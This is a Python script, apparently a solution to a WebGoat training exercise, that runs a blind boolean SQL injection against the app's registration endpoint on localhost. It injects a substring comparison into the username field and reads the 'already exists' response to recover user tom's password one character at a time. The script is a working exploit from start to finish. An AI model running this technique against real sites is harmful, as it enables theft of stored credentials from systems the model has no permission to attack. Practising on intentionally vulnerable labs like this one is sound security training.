import urllib.request
import json
import time

table = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d', 'e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

key = ""
payload = ""
payload1 = "tom' and substring(password,"
payload2 = ",1) = '"
payload3 = "' -- "
url = "http://localhost:8080/WebGoat/SqlInjection/challenge"
coo = "JSESSIONID=" + "5FF1F704E35B534BF132865299C3CB50"
coo = coo + ";JSESSIONID="+"E9593249812AE222DFED2383FB9B12D0"
header = {'Referer': 'http://localhost:8080/WebGoat/start.mvc', 'User-Agent': 'Mozilla/5.0', "Cookie":coo, "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With":"XMLHttpRequest"}

for i in range(1,24):
     for t in table:
         payload = payload1 + str(i) + payload2 + t + payload3
         # print("payload : ", payload)

         data = "username_reg="
         data += payload
         data += "&email_reg=abc@abc.com"
         data += "&password_reg=1234"
         data += "&confirm_password_reg=1234"

         req = urllib.request.Request(url=url, headers=header, method="PUT", data=bytes(data, encoding="utf-8"))
         res = urllib.request.urlopen(req)
         result = str(res.read())

         time.sleep(0.01)
         if result.count("already exists please try to register with a different username.") >= 1:
             key += t
             break

     print("key is ", key)